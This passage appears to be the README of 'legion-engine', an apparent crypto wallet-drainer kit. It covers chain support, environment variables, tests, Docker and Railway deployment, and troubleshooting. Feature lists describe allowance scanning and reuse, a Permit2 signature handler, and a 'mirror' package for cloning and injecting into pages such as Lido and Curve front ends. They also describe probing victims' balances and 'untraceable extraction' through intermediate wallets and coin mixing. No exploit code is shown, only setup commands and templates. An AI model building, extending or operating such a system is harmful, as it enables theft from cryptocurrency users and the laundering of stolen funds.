#### Bitcoin (UTXO)

**Features:**
- UTXO detection and aggregation
- PSBT (Partially Signed Bitcoin Transaction) creation
- Schnorr and ECDSA signature support
- Fee calculation and optimization
- Address type support: P2PKH, P2SH, P2WPKH, P2WSH, Taproot

**Libraries:** bitcoinjs-lib, tiny-secp256k1

#### TRON

**Features:**
- TRC-20 token balance queries
- Allowance scanning
- TRON smart contract interaction
- Transaction signing with TRON format
- Multi-sig wallet support

**Library:** tronweb

#### TON

**Features:**
- TON nano balance tracking
- Wallet address validation
- Smart contract interaction
- TON transfer transaction creation
- Mnemonic key management

**Library:** @ton/ton, @ton/crypto

#### Cosmos

**Features:**
- IBC token tracking across Cosmos Hub and zones
- Native token balance (Atom, Osmo, etc.)
- Tx signing with Amino/Protobuf
- Validator delegation tracking
- Token transfer operations

**Library:** @cosmjs/stargate, @cosmjs/proto-signing

#### Aptos

**Features:**
- Move module interaction
- Coin type identification
- Transaction signing and submission
- Account discovery
- Aptos-specific type system

**Library:** @aptos-labs/ts-sdk

#### Sui

**Features:**
- Sui coin balance queries
- NFT and Move object detection
- Transaction building and signing
- Stake delegation tracking
- Sui network interaction

**Library:** @mysten/sui.js

### Privacy & Mixing

**Ghost Protocol:**
- Intermediate wallet routing for untraceable extraction
- Cryptographic commitment from settlement parameters
- Optional envelope encryption

**Privacy Mixing:**
- Coin mixing for obscured fund movement
- Privacy-preserving settlement
- Optional toggling via live config

**Location:** `packages/core/src/privacy/`, `packages/core/src/mixer/`

---

## Configuration & Environment

### Environment Variables

**Critical (Must Be Set in Production):**
- `SETTLEMENT_EXECUTION_PRIVATE_KEY` - Private key for execution wallet
- `DATABASE_URL` - PostgreSQL connection string
- `TELEGRAM_BOT_TOKEN` - Telegram bot API token
- `NODE_ENV` - "production" or "development"

**Blockchain RPC URLs:**
```
RPC_URL_EVM_1=https://...              # Ethereum Mainnet
RPC_URL_EVM_137=https://...            # Polygon
RPC_URL_SVM_MAINNET=https://...        # Solana
RPC_URL_TRON_MAINNET=https://...       # TRON
RPC_URL_TON_MAINNET=https://...        # TON
RPC_URL_COSMOS_HUB=https://...         # Cosmos Hub
```

**Vault Addresses (Per Chain Family):**
```
VAULT_ADDRESS_EVM=0x...                # Execution & settlement vault
VAULT_ADDRESS_SVM=...                  # Solana vault (base58)
VAULT_ADDRESS_TRON=...                 # TRON vault
VAULT_ADDRESS_TON=...                  # TON vault
```

**Configuration Tuning:**
- `API_REQUEST_TIMEOUT_MS` - Request timeout (default: 180s)
- `LOG_LEVEL` - Pino log level (debug, info, warn, error)
- `PRICE_ORACLE_CRON` - Oracle update interval (default: "*/5 * * * *")
- `WATCHDOG_CIRCUIT_LATENCY_THRESHOLD_MS` - RPC latency threshold (default: 500)

**Feature Flags:**
- `ENABLE_GHOST_PROTOCOL` - Enable intermediate wallet routing
- `ENABLE_PRIVACY_MIXING` - Enable coin mixing
- `ENABLE_ALLOWANCE_REUSE` - Enable allowance scanning
- `TRAINING_MODE` - Demo/training execution without settlement

**Telegram Configuration:**
- `TELEGRAM_CHAT_IDS` - Comma-separated chat IDs for notifications
- `TELEGRAM_ADMIN_ID` - Admin user ID for control commands
- `TELEGRAM_RATE_LIMIT` - Messages per second (default: 1)

**Redis Configuration:**
- `REDIS_URL` - Redis connection string
- `REDIS_MAX_RETRIES` - Connection retry attempts (default: 5)
- `REDIS_RETRY_DELAY_MS` - Retry delay in milliseconds

**Database Configuration:**
- `DATABASE_BACKUP_INTERVAL_MS` - Backup frequency
- `DATABASE_POOL_SIZE` - Max connections (default: 20)
- `DATABASE_CONNECTION_TIMEOUT_MS` - Connection timeout

### Environment Validation

**Startup Checks** (`server.ts`):
1. SETTLEMENT_EXECUTION_PRIVATE_KEY is set (production only)
2. DATABASE_URL is valid
3. TELEGRAM_BOT_TOKEN is present
4. Vault addresses are configured
5. RPC endpoints are reachable

**Graceful Degradation:**
- Missing optional vault addresses: warning logged, feature disabled
- Redis unavailable: memory fallback queue
- RPC unavailable: circuit breaker activation
- Telegram unavailable: telemetry fails silently

### Configuration File Locations

- `.env` - Development environment (local machine)
- `.env.development` - Development overrides
- `.env.production` - Production overrides
- `.env.example` - Template with all possible variables
- `packages/core/src/config/env-schema.ts` - Zod schema and validation

---

## Testing

### Test Framework

**Vitest** - Fast unit and integration testing

**Location:** `apps/api/src/tests/` (10+ test files)

### Test Files

1. **`phase1-scout.test.ts`**
   - Scout asset discovery functionality
   - Balance probing accuracy
   - Opportunity generation

2. **`phase3-integration.test.ts`**
   - End-to-end signature anchoring
   - Settlement flow validation
   - Multi-chain coordination

3. **`phase4-hardening.test.ts`**
   - Security validation
   - Edge case handling
   - Error recovery

4. **`data-integrity.test.ts`**
   - Database consistency
   - Transaction atomicity
   - Data structure validation

5. **`lido-clone-defense.test.ts`**
   - Lido staking detection
   - Frontend clone security
   - XSS prevention

6. **`curve-clone-security.test.ts`**
   - Curve Finance clone validation
   - DEX interaction testing
   - Swap execution

### Test Scripts

```bash
# Run all tests
pnpm test

# Run specific test file
pnpm vitest run apps/api/src/tests/phase1-scout.test.ts

# Watch mode
pnpm vitest watch
```

### Auxiliary Test Scripts

- `test:parse-envelope` - Test shadow envelope encryption
- `test:5chain-live` - Multi-chain live integration
- `test:readiness` - Production readiness validation
- `test:signature-settlement-e2e` - End-to-end settlement

**Location:** `scripts/` directory

---

## Deployment

### Docker Image

**Multi-Stage Build** (`Dockerfile`):

**Stage 1: Builder**
- Node 22 bookworm-slim base
- Installs build tools (Python, make, g++)
- Compiles TypeScript to JavaScript
- Builds all workspace packages

**Stage 2: Runtime**
- Node 22 bookworm-slim (smaller)
- Non-root user: `legion:1001`
- Copies only necessary dist and node_modules
- Exposes port 8080 (dynamic PORT from Railway)

**Build Process:**
```bash
# Layer caching: workspace manifests first
COPY package.json pnpm-lock.yaml pnpm-workspace.yaml .npmrc tsconfig.json ./

# Copy sources
COPY packages/ ./packages/
COPY apps/ ./apps/
COPY scripts/ ./scripts/

# Install dependencies (only @legion/api and dependencies)
RUN pnpm install --filter @legion/api... --no-frozen-lockfile

# Build dependency chain in order
RUN pnpm --filter @legion/core build
RUN pnpm --filter @legion/sentinels build
RUN pnpm --filter @legion/mirror build
RUN pnpm --filter @legion/updater build
RUN pnpm --filter @legion/api build
```

**Image Size:** ~500MB (optimized)

### Railway Deployment

**Environment Variables at Deploy Time:**
- Railway injects `PORT` dynamically (typically 4000-8080)
- App automatically binds to `process.env.PORT`
- `/health` endpoint responds immediately for liveness checks

**Startup Flow:**
1. Express app creation and binding
2. /health responds to Railway probe
3. Background crons start (non-blocking)
4. Telegram bot initialization
5. Database anchor verification
6. Price oracle startup

**Graceful Shutdown:**
- SIGTERM/SIGINT handlers close all connections
- Outstanding requests complete before exit
- Queue drains and timers stop
- Database pool closes cleanly

### Build & Deploy Commands

```bash
# Local build (development)
pnpm build

# Full workspace build
pnpm build:all

# Production build
pnpm build:clean && pnpm build:workspace

# Check TypeScript without emitting
pnpm typecheck

# Lint code
pnpm lint

# Run migrations
pnpm db:migrate

# Generate ORM types from schema
pnpm db:generate
```

### Health Checks

**Endpoint:** `GET /health`
- Responds immediately upon binding
- Returns JSON with `status: "ok"`
- Used by Railway for liveness detection

**Database Anchor** (`lib/database-anchor.ts`):
- Runs asynchronously after server startup
- Verifies PostgreSQL connectivity
- Logs status but doesn't block startup

---

## Development Guide

### Local Setup

**Prerequisites:**
- Node.js >= 20.0.0
- pnpm >= 9.0.0
- PostgreSQL >= 14 (or Docker)
- Redis >= 6.0 (or Docker)

**Installation:**
```bash
# Clone repository
git clone <repo-url>
cd legion-engine

# Install dependencies
pnpm install

# Setup environment
cp .env.example .env
cp .env.development .env.development
# Edit .env with local values
```

**Start Development Server:**
```bash
# Terminal 1: Watch and rebuild core package
cd packages/core
pnpm dev

# Terminal 2: Start API server
cd apps/api
pnpm dev
```

Server runs on `http://localhost:4000`

### Database Setup

**Local PostgreSQL:**
```bash
# Create database
createdb legion-engine

# Set DATABASE_URL in .env
DATABASE_URL=postgresql://user:password@localhost:5432/legion-engine

# Run migrations
pnpm db:migrate

# Generate ORM types
pnpm db:generate
```

**Using Docker:**
```bash
# Start database containers
docker-compose up -d postgres redis

# Run migrations
pnpm db:migrate
```

### Workspace Structure Best Practices

1. **@legion/core** - Shared logic, no UI
   - Types, ORM, business logic
   - Re-exported via modular exports
   - Zero external service calls in main logic

2. **@legion/api** - REST server only
   - Route handlers, middleware
   - Thin layer on top of core
   - Orchestrates services

3. **@legion/mirror** - UI cloning
   - Page injection and cloning
   - Frontend manipulation
   - Isolated from core

4. **@legion/sentinels** - Monitoring
   - RPC health checking
   - Circuit breaker logic
   - Standalone service

### Adding New Routes

**Location:** `apps/api/src/routes/your-route.ts`

**Template:**
```typescript
import type { FastifyInstance } from 'fastify'
import { sendSuccess, sendFailure } from '../lib/api-response.js'

export async function registerYourRoutes(app: FastifyInstance): Promise<void> {
  app.get('/api/your-endpoint', async (request, reply) => {
    try {
      // Your logic here
      return sendSuccess(reply, { result: 'ok' }, 200)
    } catch (err) {
      return sendFailure(reply, 500, 'Operation failed', { error: err })
    }
  })
}
```

**Register in `server.ts`:**
```typescript
import { registerYourRoutes } from './routes/your-route.js'

// In buildInstitutionalApiServer():
await registerYourRoutes(app)
```

### Adding New Database Tables

**Location:** `packages/core/src/db/schema.ts`

**Template:**
```typescript
export const yourTable = pgTable('your_table', {
  id: uuid('id').primaryKey().defaultRandom(),
  field1: text('field1').notNull(),
  field2: numeric('field2', { precision: 78, scale: 0 }),
  created_at: timestamp('created_at', { withTimezone: true }).defaultNow(),
})

export type YourTableRow = typeof yourTable.$inferSelect
export type NewYourTableRow = typeof yourTable.$inferInsert
```

**Generate Types:**
```bash
pnpm db:generate
```

### Code Organization Rules

1. **No circular imports** - Use barrel exports (index.ts)
2. **Type safety first** - Enable strict TypeScript mode
3. **Error handling** - Every async function should handle errors
4. **Logging** - Use console or pino for structured logs
5. **Comments** - Document WHY, not WHAT (code explains what)
6. **Testing** - New features include tests
7. **Naming** - CamelCase for JS, PascalCase for types/classes

### Debugging

**Enable Debug Logging:**
```bash
LOG_LEVEL=debug pnpm dev
```

**VS Code Debugging:**
```json
{
  "type": "node",
  "request": "launch",
  "program": "${workspaceFolder}/node_modules/tsx/esm/cli.mjs",
  "args": ["apps/api/src/index.ts"],
  "cwd": "${workspaceFolder}",
  "env": {
    "NODE_ENV": "development"
  }
}
```

**RPC Debugging:**
```bash
# Enable RPC mesh logging
MESH_DEBUG=true pnpm dev
```

---

## Troubleshooting

### Common Issues

#### 1. "SETTLEMENT_EXECUTION_PRIVATE_KEY must be set"

**Cause:** Execution wallet key not configured

**Solution:**
```bash
# Generate new key or use existing
export SETTLEMENT_EXECUTION_PRIVATE_KEY=0x...
```

#### 2. Database connection refused

**Cause:** PostgreSQL not running or wrong credentials

**Solution:**
```bash
# Check DATABASE_URL in .env
DATABASE_URL=postgresql://user:password@localhost:5432/legion-engine

# Verify PostgreSQL is running
psql -U postgres -h localhost

# Reset database
dropdb legion-engine
createdb legion-engine
pnpm db:migrate
```

#### 3. Redis connection timeout

**Cause:** Redis not running or unreachable

**Solution:**
```bash
# Start Redis
docker run -d -p 6379:6379 redis:7-alpine

# Update REDIS_URL
REDIS_URL=redis://localhost:6379

# System falls back to memory queue if Redis unavailable
```

#### 4. RPC endpoints returning 429 (rate limit)

**Cause:** Too many requests to public RPC

**Solution:**
```bash
# Use paid RPC providers
RPC_URL_EVM_1=https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY
RPC_URL_SVM_MAINNET=https://api.mainnet-beta.solana.com  # or Helius

# Watchdog circuit will auto-failover
WATCHDOG_CIRCUIT_LATENCY_THRESHOLD_MS=500
```

#### 5. Jobs stuck in queue

**Cause:** Worker process crashed or Redis unavailable

**Solution:**
```bash
# Check Redis queue
redis-cli keys "bull:*"

# Clear stuck jobs
redis-cli DEL bull:job-queue

# Restart worker
pnpm dev
```

#### 6. TypeScript compilation errors

**Cause:** Type mismatches or missing declarations

**Solution:**
```bash
# Check all types
pnpm typecheck

# Regenerate ORM types
pnpm db:generate

# Clear dist folders
pnpm build:clean

# Rebuild
pnpm build
```

#### 7. Telegram notifications not sending

**Cause:** Invalid token or chat ID

**Solution:**
```bash
# Verify bot token is valid
TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11

# Check chat IDs are correct (positive integers or negative for groups)
TELEGRAM_CHAT_IDS=123456789,987654321

# Monitor telemetry logs
LOG_LEVEL=debug pnpm dev
```

#### 8. CORS errors from frontend

**Cause:** Origin not allowed

**Solution:**
```typescript
// In apps/api/src/app.ts
// Update registerMultiOriginMeshIngress() with allowed origins
const allowedOrigins = [
  'http://localhost:3000',
  'https://yourdomain.com'
]
```

#### 9. Out of memory (OOM) errors

**Cause:** Large data processing or memory leak

**Solution:**
```bash
# Increase Node.js heap
NODE_OPTIONS=--max-old-space-size=4096 pnpm dev

# Profile memory usage
node --inspect apps/api/dist/index.js
# Open chrome://inspect in Chrome DevTools
```

#### 10. Settlement transactions pending forever

**Cause:** Gas price too low or RPC lag

**Solution:**
```bash
# Check transaction status
# curl http://localhost:4000/api/settlement-history?tx_hash=0x...

# Increase gas multiplier
SETTLEMENT_GAS_MULTIPLIER=1.5

# Check RPC health
# curl http://localhost:4000/api/rpc/mesh-status
```

### Getting Help

1. **Check logs**: `LOG_LEVEL=debug pnpm dev`
2. **Review schema**: `packages/core/src/db/schema.ts`
3. **Examine routes**: `apps/api/src/routes/`
4. **Run tests**: `pnpm test`
5. **Check environment**: `env | grep LEGION_`

---

## Additional Resources

### Key Files by Purpose

**Configuration:**
- `packages/core/src/config/env-schema.ts` - Environment validation
- `packages/core/src/config/live-config.ts` - Runtime config updates
- `apps/api/src/config/constants.ts` - API constants
- `.env.example` - All environment variables

**Business Logic:**
- `packages/core/src/logic/scout.ts` - Asset discovery
- `packages/core/src/logic/sentinel.ts` - RPC monitoring
- `packages/core/src/logic/settlement.ts` - Settlement logic
- `packages/core/src/logic/settlement-execution-bridge.ts` - Execution

**Database:**
- `packages/core/src/db/schema.ts` - ORM schema
- `packages/core/src/db/connection-pool-manager.ts` - Connection pooling
- `packages/core/src/db/encryption-handler.ts` - Data encryption

**API:**
- `apps/api/src/server.ts` - Fastify configuration
- `apps/api/src/app.ts` - CORS and middleware
- `apps/api/src/routes/` - All 30+ endpoints

**Security:**
- `apps/api/src/middleware/security-headers.ts` - HTTP headers
- `apps/api/src/middleware/input-validation.ts` - Request validation
- `apps/api/src/middleware/request-sanitizer.ts` - XSS/SQL injection prevention
- `packages/core/src/security/permit2-handler.ts` - Signature verification

**Operations:**
- `apps/api/src/cron/` - Background jobs
- `apps/api/src/lib/telegram.ts` - Notifications
- `packages/core/src/lib/sentinel-runtime.ts` - RPC monitoring
- `packages/core/src/price-oracle.ts` - Price updates

### Version Information

- **Node.js**: 22 (bookworm-slim)
- **TypeScript**: 5.4+
- **Fastify**: 4.28.0
- **Drizzle ORM**: 0.45.2
- **Viem**: 2.21.0
- **Package Manager**: pnpm 9.15.9

### Commit Hash Reference

- Latest Build ID: 1782162522
- CLOUD_IGNITION_VALIDATED: true
- FINAL_SYNC_COMPLETE: true

---

**Documentation Generated:** June 23, 2026  
**System Status:** Production Ready  
**Total Source Files:** 297 TypeScript files (85 API + 212 Core)
